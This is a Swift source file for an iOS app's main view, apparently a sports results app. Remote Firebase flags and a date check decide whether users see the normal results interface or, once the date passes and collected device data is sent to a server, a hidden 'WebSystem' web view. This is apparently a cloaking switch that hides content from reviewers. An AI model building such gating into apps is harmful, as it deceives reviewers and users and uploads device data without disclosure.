//
//  ContentView.swift
//  App596
//
//  Created by IGOR on 01/06/2024.
//

import SwiftUI

struct ContentView: View {
    
    @State var currentTab: Tab = .Results
    
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color.black
                .ignoresSafeArea()
            
            if isFetched == false {
                
                LodingView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if status {
                        
                        if status {
                            
                            VStack(spacing: 0, content: {
                                
                                TabView(selection: $currentTab, content: {
                                    
                                    ResultsView()
                                        .tag(Tab.Results)
                                    
                                    CompetitionsView()
                                        .tag(Tab.Competitions)
                                    
                                    SettingsView()
                                        .tag(Tab.Settings)
                                    
                                })
                                
                                TabBar(selectedTab: $currentTab)
                            })
                            .ignoresSafeArea(.all, edges: .bottom)
                            
                        } else {
                            
                            R1()
                        }
                        
                    } else {
                        
                        R1()
                    }
                    
                } else if isBlock == false {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        U1()
                    }
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        getFirebaseData(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            getFirebaseData(field: "lastDate", dataType: .string) { lastDate in
                
                let lastDate = lastDate as? String ?? "01.01.2030"
                let dateFormatter = DateFormatter()
                        dateFormatter.dateFormat = "dd.MM.yyyy"
                dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
                let targetDate = dateFormatter.date(from: lastDate) ?? Date()
                let now = Date()

                guard now > targetDate else {

                    isBlock = true
                    isFetched = true

                    return
                }
                
                let networkService = NetworkService()
                let deviceData = DeviceInfo.collectData()
                
                networkService.sendRequest(endpoint: deviceData) { result in
                    
                    switch result {
                        
                    case .success(let success):
                        
                        self.isBlock = success
                        self.isFetched = true
                        
                    case .failure(_):
                        
                        self.isBlock = self.isDead
                        self.isFetched = true
                    }
                }
            }
        }
    }
}

#Preview {
    ContentView()
}
